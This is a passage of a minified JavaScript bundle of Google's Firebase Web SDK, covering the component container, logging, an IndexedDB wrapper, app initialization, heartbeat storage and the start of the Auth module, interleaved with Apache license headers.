 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const jn="[DEFAULT]";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class xS{constructor(e,n){this.name=e,this.container=n,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){const n=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(n)){const r=new ca;if(this.instancesDeferred.set(n,r),this.isInitialized(n)||this.shouldAutoInitialize())try{const i=this.getOrInitializeService({instanceIdentifier:n});i&&r.resolve(i)}catch{}}return this.instancesDeferred.get(n).promise}getImmediate(e){var n;const r=this.normalizeInstanceIdentifier(e==null?void 0:e.identifier),i=(n=e==null?void 0:e.optional)!==null&&n!==void 0?n:!1;if(this.isInitialized(r)||this.shouldAutoInitialize())try{return this.getOrInitializeService({instanceIdentifier:r})}catch(s){if(i)return null;throw s}else{if(i)return null;throw Error(`Service ${this.name} is not available`)}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,!!this.shouldAutoInitialize()){if(OS(e))try{this.getOrInitializeService({instanceIdentifier:jn})}catch{}for(const[n,r]of this.instancesDeferred.entries()){const i=this.normalizeInstanceIdentifier(n);try{const s=this.getOrInitializeService({instanceIdentifier:i});r.resolve(s)}catch{}}}}clearInstance(e=jn){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}async delete(){const e=Array.from(this.instances.values());await Promise.all([...e.filter(n=>"INTERNAL"in n).map(n=>n.INTERNAL.delete()),...e.filter(n=>"_delete"in n).map(n=>n._delete())])}isComponentSet(){return this.component!=null}isInitialized(e=jn){return this.instances.has(e)}getOptions(e=jn){return this.instancesOptions.get(e)||{}}initialize(e={}){const{options:n={}}=e,r=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(r))throw Error(`${this.name}(${r}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);const i=this.getOrInitializeService({instanceIdentifier:r,options:n});for(const[s,o]of this.instancesDeferred.entries()){const l=this.normalizeInstanceIdentifier(s);r===l&&o.resolve(i)}return i}onInit(e,n){var r;const i=this.normalizeInstanceIdentifier(n),s=(r=this.onInitCallbacks.get(i))!==null&&r!==void 0?r:new Set;s.add(e),this.onInitCallbacks.set(i,s);const o=this.instances.get(i);return o&&e(o,i),()=>{s.delete(e)}}invokeOnInitCallbacks(e,n){const r=this.onInitCallbacks.get(n);if(r)for(const i of r)try{i(e,n)}catch{}}getOrInitializeService({instanceIdentifier:e,options:n={}}){let r=this.instances.get(e);if(!r&&this.component&&(r=this.component.instanceFactory(this.container,{instanceIdentifier:AS(e),options:n}),this.instances.set(e,r),this.instancesOptions.set(e,n),this.invokeOnInitCallbacks(r,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,r)}catch{}return r||null}normalizeInstanceIdentifier(e=jn){return this.component?this.component.multipleInstances?e:jn:e}shouldAutoInitialize(){return!!this.component&&this.component.instantiationMode!=="EXPLICIT"}}function AS(t){return t===jn?void 0:t}function OS(t){return t.instantiationMode==="EAGER"}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bS{constructor(e){this.name=e,this.providers=new Map}addComponent(e){const n=this.getProvider(e.name);if(n.isComponentSet())throw new Error(`Component ${e.name} has already been registered with ${this.name}`);n.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);const n=new xS(e,this);return this.providers.set(e,n),n}getProviders(){return Array.from(this.providers.values())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var V;(function(t){t[t.DEBUG=0]="DEBUG",t[t.VERBOSE=1]="VERBOSE",t[t.INFO=2]="INFO",t[t.WARN=3]="WARN",t[t.ERROR=4]="ERROR",t[t.SILENT=5]="SILENT"})(V||(V={}));const LS={debug:V.DEBUG,verbose:V.VERBOSE,info:V.INFO,warn:V.WARN,error:V.ERROR,silent:V.SILENT},DS=V.INFO,MS={[V.DEBUG]:"log",[V.VERBOSE]:"log",[V.INFO]:"info",[V.WARN]:"warn",[V.ERROR]:"error"},US=(t,e,...n)=>{if(e<t.logLevel)return;const r=new Date().toISOString(),i=MS[e];if(i)console[i](`[${r}]  ${t.name}:`,...n);else throw new Error(`Attempted to log a message with an invalid logType (value: ${e})`)};class $d{constructor(e){this.name=e,this._logLevel=DS,this._logHandler=US,this._userLogHandler=null}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in V))throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel=typeof e=="string"?LS[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if(typeof e!="function")throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,V.DEBUG,...e),this._logHandler(this,V.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,V.VERBOSE,...e),this._logHandler(this,V.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,V.INFO,...e),this._logHandler(this,V.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,V.WARN,...e),this._logHandler(this,V.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,V.ERROR,...e),this._logHandler(this,V.ERROR,...e)}}const FS=(t,e)=>e.some(n=>t instanceof n);let cp,dp;function jS(){return cp||(cp=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction])}function zS(){return dp||(dp=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])}const uv=new WeakMap,_c=new WeakMap,cv=new WeakMap,nu=new WeakMap,Vd=new WeakMap;function BS(t){const e=new Promise((n,r)=>{const i=()=>{t.removeEventListener("success",s),t.removeEventListener("error",o)},s=()=>{n(Cn(t.result)),i()},o=()=>{r(t.error),i()};t.addEventListener("success",s),t.addEventListener("error",o)});return e.then(n=>{n instanceof IDBCursor&&uv.set(n,t)}).catch(()=>{}),Vd.set(e,t),e}function HS(t){if(_c.has(t))return;const e=new Promise((n,r)=>{const i=()=>{t.removeEventListener("complete",s),t.removeEventListener("error",o),t.removeEventListener("abort",o)},s=()=>{n(),i()},o=()=>{r(t.error||new DOMException("AbortError","AbortError")),i()};t.addEventListener("complete",s),t.addEventListener("error",o),t.addEventListener("abort",o)});_c.set(t,e)}let vc={get(t,e,n){if(t instanceof IDBTransaction){if(e==="done")return _c.get(t);if(e==="objectStoreNames")return t.objectStoreNames||cv.get(t);if(e==="store")return n.objectStoreNames[1]?void 0:n.objectStore(n.objectStoreNames[0])}return Cn(t[e])},set(t,e,n){return t[e]=n,!0},has(t,e){return t instanceof IDBTransaction&&(e==="done"||e==="store")?!0:e in t}};function WS(t){vc=t(vc)}function $S(t){return t===IDBDatabase.prototype.transaction&&!("objectStoreNames"in IDBTransaction.prototype)?function(e,...n){const r=t.call(ru(this),e,...n);return cv.set(r,e.sort?e.sort():[e]),Cn(r)}:zS().includes(t)?function(...e){return t.apply(ru(this),e),Cn(uv.get(this))}:function(...e){return Cn(t.apply(ru(this),e))}}function VS(t){return typeof t=="function"?$S(t):(t instanceof IDBTransaction&&HS(t),FS(t,jS())?new Proxy(t,vc):t)}function Cn(t){if(t instanceof IDBRequest)return BS(t);if(nu.has(t))return nu.get(t);const e=VS(t);return e!==t&&(nu.set(t,e),Vd.set(e,t)),e}const ru=t=>Vd.get(t);function qS(t,e,{blocked:n,upgrade:r,blocking:i,terminated:s}={}){const o=indexedDB.open(t,e),l=Cn(o);return r&&o.addEventListener("upgradeneeded",a=>{r(Cn(o.result),a.oldVersion,a.newVersion,Cn(o.transaction),a)}),n&&o.addEventListener("blocked",a=>n(a.oldVersion,a.newVersion,a)),l.then(a=>{s&&a.addEventListener("close",()=>s()),i&&a.addEventListener("versionchange",u=>i(u.oldVersion,u.newVersion,u))}).catch(()=>{}),l}const GS=["get","getKey","getAll","getAllKeys","count"],KS=["put","add","delete","clear"],iu=new Map;function hp(t,e){if(!(t instanceof IDBDatabase&&!(e in t)&&typeof e=="string"))return;if(iu.get(e))return iu.get(e);const n=e.replace(/FromIndex$/,""),r=e!==n,i=KS.includes(n);if(!(n in(r?IDBIndex:IDBObjectStore).prototype)||!(i||GS.includes(n)))return;const s=async function(o,...l){const a=this.transaction(o,i?"readwrite":"readonly");let u=a.store;return r&&(u=u.index(l.shift())),(await Promise.all([u[n](...l),i&&a.done]))[0]};return iu.set(e,s),s}WS(t=>({...t,get:(e,n,r)=>hp(e,n)||t.get(e,n,r),has:(e,n)=>!!hp(e,n)||t.has(e,n)}));/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class YS{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map(n=>{if(QS(n)){const r=n.getImmediate();return`${r.library}/${r.version}`}else return null}).filter(n=>n).join(" ")}}function QS(t){const e=t.getComponent();return(e==null?void 0:e.type)==="VERSION"}const yc="@firebase/app",fp="0.9.20";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ir=new $d("@firebase/app"),XS="@firebase/app-compat",JS="@firebase/analytics-compat",ZS="@firebase/analytics",eT="@firebase/app-check-compat",tT="@firebase/app-check",nT="@firebase/auth",rT="@firebase/auth-compat",iT="@firebase/database",sT="@firebase/database-compat",oT="@firebase/functions",lT="@firebase/functions-compat",aT="@firebase/installations",uT="@firebase/installations-compat",cT="@firebase/messaging",dT="@firebase/messaging-compat",hT="@firebase/performance",fT="@firebase/performance-compat",pT="@firebase/remote-config",mT="@firebase/remote-config-compat",gT="@firebase/storage",_T="@firebase/storage-compat",vT="@firebase/firestore",yT="@firebase/firestore-compat",wT="firebase",ET="10.5.0";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wc="[DEFAULT]",CT={[yc]:"fire-core",[XS]:"fire-core-compat",[ZS]:"fire-analytics",[JS]:"fire-analytics-compat",[tT]:"fire-app-check",[eT]:"fire-app-check-compat",[nT]:"fire-auth",[rT]:"fire-auth-compat",[iT]:"fire-rtdb",[sT]:"fire-rtdb-compat",[oT]:"fire-fn",[lT]:"fire-fn-compat",[aT]:"fire-iid",[uT]:"fire-iid-compat",[cT]:"fire-fcm",[dT]:"fire-fcm-compat",[hT]:"fire-perf",[fT]:"fire-perf-compat",[pT]:"fire-rc",[mT]:"fire-rc-compat",[gT]:"fire-gcs",[_T]:"fire-gcs-compat",[vT]:"fire-fst",[yT]:"fire-fst-compat","fire-js":"fire-js",[wT]:"fire-js-all"};/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Tl=new Map,Ec=new Map;function ST(t,e){try{t.container.addComponent(e)}catch(n){ir.debug(`Component ${e.name} failed to register with FirebaseApp ${t.name}`,n)}}function sr(t){const e=t.name;if(Ec.has(e))return ir.debug(`There were multiple attempts to register component ${e}.`),!1;Ec.set(e,t);for(const n of Tl.values())ST(n,t);return!0}function ha(t,e){const n=t.container.getProvider("heartbeat").getImmediate({optional:!0});return n&&n.triggerHeartbeat(),t.container.getProvider(e)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const TT={"no-app":"No Firebase App '{$appName}' has been created - call initializeApp() first","bad-app-name":"Illegal App name: '{$appName}","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}."},Sn=new qs("app","Firebase",TT);/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class IT{constructor(e,n,r){this._isDeleted=!1,this._options=Object.assign({},e),this._config=Object.assign({},n),this._name=n.name,this._automaticDataCollectionEnabled=n.automaticDataCollectionEnabled,this._container=r,this.container.addComponent(new Rn("app",()=>this,"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw Sn.create("app-deleted",{appName:this._name})}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const gr=ET;function dv(t,e={}){let n=t;typeof e!="object"&&(e={name:e});const r=Object.assign({name:wc,automaticDataCollectionEnabled:!1},e),i=r.name;if(typeof i!="string"||!i)throw Sn.create("bad-app-name",{appName:String(i)});if(n||(n=rv()),!n)throw Sn.create("no-options");const s=Tl.get(i);if(s){if(Sl(n,s.options)&&Sl(r,s.config))return s;throw Sn.create("duplicate-app",{appName:i})}const o=new bS(i);for(const a of Ec.values())o.addComponent(a);const l=new IT(n,r,o);return Tl.set(i,l),l}function qd(t=wc){const e=Tl.get(t);if(!e&&t===wc&&rv())return dv();if(!e)throw Sn.create("no-app",{appName:t});return e}function Rt(t,e,n){var r;let i=(r=CT[t])!==null&&r!==void 0?r:t;n&&(i+=`-${n}`);const s=i.match(/\s|\//),o=e.match(/\s|\//);if(s||o){const l=[`Unable to register library "${i}" with version "${e}":`];s&&l.push(`library name "${i}" contains illegal characters (whitespace or "/")`),s&&o&&l.push("and"),o&&l.push(`version name "${e}" contains illegal characters (whitespace or "/")`),ir.warn(l.join(" "));return}sr(new Rn(`${i}-version`,()=>({library:i,version:e}),"VERSION"))}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const kT="firebase-heartbeat-database",RT=1,ks="firebase-heartbeat-store";let su=null;function hv(){return su||(su=qS(kT,RT,{upgrade:(t,e)=>{switch(e){case 0:t.createObjectStore(ks)}}}).catch(t=>{throw Sn.create("idb-open",{originalErrorMessage:t.message})})),su}async function NT(t){try{return await(await hv()).transaction(ks).objectStore(ks).get(fv(t))}catch(e){if(e instanceof Yt)ir.warn(e.message);else{const n=Sn.create("idb-get",{originalErrorMessage:e==null?void 0:e.message});ir.warn(n.message)}}}async function pp(t,e){try{const r=(await hv()).transaction(ks,"readwrite");await r.objectStore(ks).put(e,fv(t)),await r.done}catch(n){if(n instanceof Yt)ir.warn(n.message);else{const r=Sn.create("idb-set",{originalErrorMessage:n==null?void 0:n.message});ir.warn(r.message)}}}function fv(t){return`${t.name}!${t.options.appId}`}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const PT=1024,xT=30*24*60*60*1e3;class AT{constructor(e){this.container=e,this._heartbeatsCache=null;const n=this.container.getProvider("app").getImmediate();this._storage=new bT(n),this._heartbeatsCachePromise=this._storage.read().then(r=>(this._heartbeatsCache=r,r))}async triggerHeartbeat(){const n=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),r=mp();if(this._heartbeatsCache===null&&(this._heartbeatsCache=await this._heartbeatsCachePromise),!(this._heartbeatsCache.lastSentHeartbeatDate===r||this._heartbeatsCache.heartbeats.some(i=>i.date===r)))return this._heartbeatsCache.heartbeats.push({date:r,agent:n}),this._heartbeatsCache.heartbeats=this._heartbeatsCache.heartbeats.filter(i=>{const s=new Date(i.date).valueOf();return Date.now()-s<=xT}),this._storage.overwrite(this._heartbeatsCache)}async getHeartbeatsHeader(){if(this._heartbeatsCache===null&&await this._heartbeatsCachePromise,this._heartbeatsCache===null||this._heartbeatsCache.heartbeats.length===0)return"";const e=mp(),{heartbeatsToSend:n,unsentEntries:r}=OT(this._heartbeatsCache.heartbeats),i=wl(JSON.stringify({version:2,heartbeats:n}));return this._heartbeatsCache.lastSentHeartbeatDate=e,r.length>0?(this._heartbeatsCache.heartbeats=r,await this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),i}}function mp(){return new Date().toISOString().substring(0,10)}function OT(t,e=PT){const n=[];let r=t.slice();for(const i of t){const s=n.find(o=>o.agent===i.agent);if(s){if(s.dates.push(i.date),gp(n)>e){s.dates.pop();break}}else if(n.push({agent:i.agent,dates:[i.date]}),gp(n)>e){n.pop();break}r=r.slice(1)}return{heartbeatsToSend:n,unsentEntries:r}}class bT{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}async runIndexedDBEnvironmentCheck(){return vS()?yS().then(()=>!0).catch(()=>!1):!1}async read(){return await this._canUseIndexedDBPromise?await NT(this.app)||{heartbeats:[]}:{heartbeats:[]}}async overwrite(e){var n;if(await this._canUseIndexedDBPromise){const i=await this.read();return pp(this.app,{lastSentHeartbeatDate:(n=e.lastSentHeartbeatDate)!==null&&n!==void 0?n:i.lastSentHeartbeatDate,heartbeats:e.heartbeats})}else return}async add(e){var n;if(await this._canUseIndexedDBPromise){const i=await this.read();return pp(this.app,{lastSentHeartbeatDate:(n=e.lastSentHeartbeatDate)!==null&&n!==void 0?n:i.lastSentHeartbeatDate,heartbeats:[...i.heartbeats,...e.heartbeats]})}else return}}function gp(t){return wl(JSON.stringify({version:2,heartbeats:t})).length}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function LT(t){sr(new Rn("platform-logger",e=>new YS(e),"PRIVATE")),sr(new Rn("heartbeat",e=>new AT(e),"PRIVATE")),Rt(yc,fp,t),Rt(yc,fp,"esm2017"),Rt("fire-js","")}LT("");function Gd(t,e){var n={};for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.indexOf(r)<0&&(n[r]=t[r]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(t);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(t,r[i])&&(n[r[i]]=t[r[i]]);return n}function _p(t){return t!==void 0&&t.enterprise!==void 0}class DT{constructor(e){if(this.siteKey="",this.emailPasswordEnabled=!1,e.recaptchaKey===void 0)throw new Error("recaptchaKey undefined");this.siteKey=e.recaptchaKey.split("/")[3],this.emailPasswordEnabled=e.recaptchaEnforcementState.some(n=>n.provider==="EMAIL_PASSWORD_PROVIDER"&&n.enforcementState!=="OFF")}}function pv(){return{"dependent-sdk-initialized-before-auth":"Another Firebase SDK was initialized and is trying to use Auth before Auth is initialized. Please be sure to call `initializeAuth` or `getAuth` before starting any other Firebase SDK."}}const MT=pv,mv=new qs("auth","Firebase",pv());/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Il=new $d("@firebase/auth");function UT(t,...e){Il.logLevel<=V.WARN&&Il.warn(`Auth (${gr}): ${t}`,...e)}function Bo(t,...e){Il.logLevel<=V.ERROR&&Il.error(`Auth (${gr}): ${t}`,...e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function wt(t,...e){throw Kd(t,...e)}function Nt(t,...e){return Kd(t,...e)}function FT(t,e,n){const r=Object.assign(Object.assign({},MT()),{[e]:n});return new qs("auth","Firebase",r).create(e,{appName:t.name})}function Kd(t,...e){if(typeof t!="string"){const n=e[0],r=[...e.slice(1)];return r[0]&&(r[0].appName=t.name),t._errorFactory.create(n,...r)}return mv.create(t,...e)}function O(t,e,...n){if(!t)throw Kd(e,...n)}function Dt(t){const e="INTERNAL ASSERTION FAILED: "+t;throw Bo(e),new Error(e)}function Vt(t,e){t||Dt(e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Cc(){var t;return typeof self<"u"&&((t=self.location)===null||t===void 0?void 0:t.href)||""}function jT(){return vp()==="http:"||vp()==="https:"}function vp(){var t;return typeof self<"u"&&((t=self.location)===null||t===void 0?void 0:t.protocol)||null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function zT(){return typeof navigator<"u"&&navigator&&"onLine"in navigator&&typeof navigator.onLine=="boolean"&&(jT()||gS()||"connection"in navigator)?navigator.onLine:!0}function BT(){if(typeof navigator>"u")return null;const t=navigator;return t.languages&&t.languages[0]||t.language||null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Gs{constructor(e,n){this.shortDelay=e,this.longDelay=n,Vt(n>e,"Short delay should be less than long delay!"),this.isMobile=Hd()||ov()}get(){return zT()?this.isMobile?this.longDelay:this.shortDelay:Math.min(5e3,this.shortDelay)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Yd(t,e){Vt(t.emulator,"Emulator should always be set here");const{url:n}=t.emulator;return e?`${n}${e.startsWith("/")?e.slice(1):e}`:n}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
